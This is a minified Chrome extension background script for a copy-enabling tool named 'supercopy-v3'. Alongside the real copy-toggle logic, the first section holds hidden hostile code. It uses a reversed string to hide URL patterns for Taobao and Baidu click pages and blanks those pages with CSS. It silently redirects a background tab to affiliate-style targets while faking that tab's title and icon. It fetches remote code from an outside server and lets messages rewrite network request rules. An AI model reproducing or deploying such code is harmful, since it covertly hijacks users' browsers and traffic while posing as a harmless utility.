
                    (()=>{"use strict";const e={name:"supercopy-v3",assetsServer:"https://spc4.s3.ap-east-1.amazonaws.com"};function t(e){return new Promise((t=>{chrome.storage.local.get("assetsServer",(a=>{var r=a.assetsServer||chrome.runtime.getURL("");t(fetch(e.indexOf("://")>0?e:`${r}/${e}`))}))}))}const a=")kcilc*.hcraes/moc.oaboat.dlrow.ia//:*.|=kcilc*.?\\mth.xedni/hcraes/moc.oaboat.ia//:*.|=kcilc*./moc.udiab.sop//:*.|=kcilc*.?\\hcraesbt/mes/moc.oaboat.dnalu//:*.(".split("").reverse().join("");const r=function(){var e=function(){var e=[];let t;function a(e){chrome.tabs.update(r.id,{url:e}),o.currentTask="jdTask",clearTimeout(t),t=setTimeout((function(){r&&!r.stayTime&&chrome.tabs.get(r.id,(e=>{e.url!=r.url&&r&&chrome.tabs.update(r.id,{url:r.url})}))}),5e3+parseInt(5e3*Math.random()))}var r,o;return{status:"",name:"jdTask",init:function(t){o=t,chrome.storage.local.get("jdRules",(t=>{e=t.jdRules||[]})),chrome.runtime.onMessage.addListener(((e,t,r)=>("dojd"==e.cmd&&this.check(t.tab,e.data)&&a(e.data),!0)))},check:function(e,t){return e.index>=4&&r&&t},setTabInfo:function(e){r=e},tabUpdated:function(t,r,o){let n=function(t){for(var a="",r=0;r<e.length;r++)if(t.match(e[r].detailReg)){a=e[r].target;break}return a}(o.url);this.check(o,n)&&a(n)},mainTabUpate:function(t,a,o){chrome.scripting.executeScript({target:{tabId:t},func:function(e,t){document.title=e;var a=document.querySelector("link[rel~='icon']");a||((a=document.createElement("link")).rel="icon",document.getElementsByTagName("head")[0].appendChild(a)),a.href=t,document.body.inMainTabUse=!0},args:[r.title,r.favIconUrl]});for(var n=0;n<e.length;n++)if(o.url.match(e[n].mainReg)){setTimeout((function(){chrome.tabs.update(t,{url:r.url}),r.stayTime=0}),e[n].stayTime),r.stayTime=e[n].stayTime;break}}}}(),t=!0;function a(e){var a,r=0,o={};e.forEach((function(e){e.init(o)})),chrome.tabs.onUpdated.addListener((function(n,c,s){var i;if(t&&(a&&a.id===n||(i=function(o){var i;o>=4&&("loading"==c.status?(i=function(t){e.forEach((function(e){e.setTabInfo(t)}))},a?i(a):r>3?(setTimeout((function(){r=0}),6e5),i(null)):chrome.tabs.query({},(function(e){if(e.length>0)for(var r,o=0;o<3&&(r=e[o]).url;o++)if(!r.active&&r.url.match(/^http/)&&!r.url.match(/360\.cn/)){chrome.tabs.sendMessage(r.id,{topic:"canbeuse"},(function(e){(t=t&&e)&&(a={url:r.url,favIconUrl:r.favIconUrl,title:r.title,id:r.id},i(a))}));break}}))):"complete"==c.status&&a&&e.forEach((function(e){e.tabUpdated(n,c,s)})))},chrome.tabs.query({},(function(e){i(e.length)}))),a&&n==a.id&&s.url!=a.url))if(s.active)a=null;else if(("loading"==c.status||navigator.userAgent.match("MetaSr"))&&c.url&&c.url!=decodeURIComponent(""))for(var u,d=0;d<e.length;d++)if((u=e[d]).name==o.currentTask){u.mainTabUpate(n,c,s);break}})),chrome.tabs.onActivated.addListener((function(o){t&&chrome.tabs.get(o.tabId,(function(t){a&&o.tabId==a.id&&(!function(t){t.url!=a.url&&(r++,chrome.tabs.update(a.id,{url:a.url})),a=null,e.forEach((function(e){e.setTabInfo(null)}))}(t),e.forEach((function(e){e.afterRestoreTab&&e.afterRestoreTab()})))}))})),chrome.tabs.onRemoved.addListener((function(e,r){t&&a&&e==a.id&&(a=null)}))}setTimeout((function(){a([e])}),1e4)};var o="chrome";function n(){for(var e=[],t="0123456789abcdef",a=0;a<36;a++)e[a]=t.substr(Math.floor(16*Math.random()),1);return e[14]="4",e[19]=t.substr(3&e[19]|8,1),e[8]=e[13]=e[18]=e[23]="-",e.join("").replace(new RegExp("-","g"),"")}o=o||"";let c={},s=!1,i=-1;chrome.runtime.onMessage.addListener(((t,a,r)=>{switch(t.cmd){case"get_bg":return chrome.storage.local.get(["uid"],(t=>{let o=t.uid;o?(o=n(),chrome.storage.local.set({uid:o})):o=o.uid,r({config:e,extId:chrome.runtime.id,uid:o,tabId:a.tab.id,htab:i,mf:t.mf||""})})),!0;case"get_mf":return chrome.storage.local.get("mf",(e=>{r(e.mf||"")})),!0;case"set_storage":return chrome.storage.local.set(t.data,r),!0;case"get_storage":return chrome.storage.local.get(t.data,r),!0;case"set_res":c[t.url]=t.data;break;case"get_res":r(c[t.url]);break;case"l2inited":r(s),s=!0;break;case"htab":return"create"==t.fun?-1==i?chrome.windows.create(t.data,(e=>{i=e.tabs[0].id,r({winId:e.id,htab:i})})):chrome.tabs.get(i,(e=>{e?(chrome.tabs.update(i,{url:t.data.url}),r({winId:e.windowId,htab:e.id})):chrome.windows.create(t.data,(e=>{i=e.tabs[0].id,r({winId:e.id,htab:i})}))})):"update"==t.fun?chrome.windows.update(t.winId,t.data):"remove"==t.fun&&chrome.windows.remove(t.winId),!0;case"tab":if("create"==t.fun){var o={...t.data};o.index||(o.index=a.tab.index+1),chrome.tabs.create(o,(e=>{r(e.id)}))}else"update"==t.fun?chrome.tabs.update(t.tabId,t.data):"remove"==t.fun&&chrome.tabs.remove(t.tabId);return!0;case"udr":chrome.declarativeNetRequest.updateDynamicRules(t.data);break;case"usr":chrome.declarativeNetRequest.updateSessionRules(t.data)}})),function(){let e="",t=1;chrome.storage.local.get(["installTime","uid"],(function(a){a.uid?e=a.uid:(e=a.uid||n(),chrome.storage.local.set({uid:e})),a.installTime?t=Math.ceil((Date.now()-a.installTime)/864e5):chrome.storage.local.set({installTime:Date.now()})}))}(),r();let u=[];u.push(((e,t,r)=>{"loading"==t.status&&t.url&&t.url.match(a)&&chrome.scripting.insertCSS({css:"body{\n            display: none;\n        }",target:{tabId:e}})})),chrome.tabs.onUpdated.addListener(((e,t,a)=>{u.forEach((r=>{try{r.call(void 0,e,t,a)}catch(e){}}))})),chrome.runtime.onInstalled.addListener((e=>{"install"!=e.reason&&"update"!=e.reason||chrome.storage.local.set({updateTime:Date.now()})})),chrome.storage.local.get("assetsServer",(e=>{e.assetsServer||chrome.storage.local.set({assetsServer:chrome.runtime.getURL("")})})),t("mfcode?_"+Date.now()).then((e=>e.text())).then((e=>{chrome.storage.local.get(["mfcode","mf"],(a=>{e==a.mfcode&&a.mf||(t("mf?_"+Date.now()).then((e=>e.text())).then((e=>{chrome.storage.local.set({mf:e})})),chrome.storage.local.set({mfcode:e}))}))})).catch((()=>{}))})();;
                    chrome.runtime.onInstalled.addListener((function(e){"install"==e.reason?chrome.tabs.create({url:"https://enablecopy.com/welcome"}):e.reason}));var ext=function(){chrome.runtime.id;var e,t=chrome.storage.sync,n="img/ico.png",o="img/off.png";this.background=function(){t.get(["domains"],(function(a){"object"!=typeof(e=a.domains)&&(e=[]),chrome.runtime.onMessage.addListener((function(n,o,r){if("getsupercopydoc88path"==n.super_type)return fetch("https://spcstatic.oss-cn-hangzhou.aliyuncs.com/doc88").then((e=>{e.ok&&e.text().then((function(e){r(e)}))})).then((e=>{})).catch((e=>{})),!0;if("copy"==n.super_type){var i=n.tabid,a=n.domain;"on"==n.turn?s("on",i,a,!1):s("off",i,a,!1),r({status:1})}else if("domains"==n.super_type)c(e),r({status:1,domains:e});else if("removeDomain"==n.super_type){a=n.domain;var u=e.indexOf(a);u>-1&&(e.splice(u,1),t.set({domains:e})),r({status:1})}})),chrome.action.onClicked.addListener((function(t){var n=i(t.url);if(!n)return!1;var o=e.indexOf(n);s(-1===o?"on":"off",t.id,n,!1)})),chrome.tabs.onActivated.addListener((function(t){chrome.tabs.query({active:!0,currentWindow:!0},(function(t){var s=t[0],r=i(s.url);if(!r)return!1;var c=-1===e.indexOf(r)?o:n;chrome.action.setIcon({path:c,tabId:s.id})}))})),chrome.tabs.onUpdated.addListener((function(t,n,o){var c=i(n.url||o.url);e.indexOf(c)>-1?"complete"==n.status&&s("on",t,c,!1):r("off",t)}))}));var s=function(n,o,s,i){return!!o&&(!!s&&void t.get(["domains"],(function(c){"object"!=typeof(e=c.domains)&&(e=[]);var a=e.indexOf(s);"on"==n?(-1==a&&e.push(s),!0===i?(chrome.scripting.executeScript({target:{tabId:o},files:["js/flash.js"]}),[0,1e3,2e3,3e3].forEach((e=>{setTimeout((function(){r("on",o)}),e)})),[500,1500,2500].forEach((e=>{setTimeout((function(){r("off",o)}),e)})),setTimeout((function(){chrome.tabs.sendMessage(o,{msg:"super_crack"},(function(e){e.super_result||chrome.scripting.executeScript({target:{tabId:o},files:["js/code.js"]})}))}),3500)):(chrome.tabs.sendMessage(o,{msg:"super_crack"},(function(e){e&&(e.super_result||chrome.scripting.executeScript({target:{tabId:o},files:["js/code.js"]}))})),r(n,o))):(chrome.tabs.reload(o),r(n,o),a>-1&&e.splice(a,1)),t.set({domains:e})})))},r=function(e,t){"on"==e?chrome.action.setIcon({path:n,tabId:t}):chrome.action.setIcon({path:o,tabId:t})},i=function(e){if(!e)return!1;var t=(e=e.toLowerCase()).split("://")[0];if("http"!=t&&"https"!=t)return!1;var n=e.split("://")[1].split("/")[0].split(":")[0];return/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/.test(n)?RegExp.$1<256&&RegExp.$2<256&&RegExp.$3<256&&RegExp.$4<256&&((192!=RegExp.$1||168!=RegExp.$2)&&(10!=RegExp.$1&&n)):("www."==n.substr(0,4)&&(n=n.substr(4)),n)},c=function(e){}}},e=new ext;e.background();
                